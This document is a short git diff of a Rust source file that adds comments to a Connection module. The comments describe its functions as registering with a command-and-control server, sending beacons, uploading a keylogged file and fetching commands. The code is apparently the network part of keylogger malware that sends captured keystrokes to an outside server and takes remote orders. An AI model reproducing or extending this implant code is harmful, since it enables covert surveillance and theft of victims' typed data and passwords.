@@ -25,7 +25,7 @@ impl<'a> Connection<'a>{
     }
 
 
-    //the only one that should use a sync
+    //function that registers itself to the c2 server
     pub async fn register(&self, os:& str) -> Result<String, reqwest::Error> {
         let url = format!("{}{}",self.url,self.reg);
 
@@ -39,6 +39,7 @@ impl<'a> Connection<'a>{
         Ok(response.text().await?)
     }
 
+    //fiunction that sends a becon to the c2 server
     pub async fn becon(&self, id:& str) -> Result<String, reqwest::Error> {
         let url = format!("{}{}",self.url,self.becon);
         let params = [("id", id), ("timestamp", &chrono::Utc::now().to_string())];
@@ -51,6 +52,7 @@ impl<'a> Connection<'a>{
         Ok(response.text().await?)
     }
 
+    //function that sends the keylogged file to the c2 server
     pub async fn send_data(&self, id:& str, data: &String) -> Result<String, reqwest::Error> {
 
         let url = format!("{}{}",self.url,self.upload);
@@ -68,6 +70,7 @@ impl<'a> Connection<'a>{
         Ok(response.text().await?)
     }
 
+    //function that sends a get request to get commands
     pub async fn get_command(&self, id:& str,) -> Result<String, reqwest::Error> {
 
         let url = format!("{}{}",self.url,self.command);
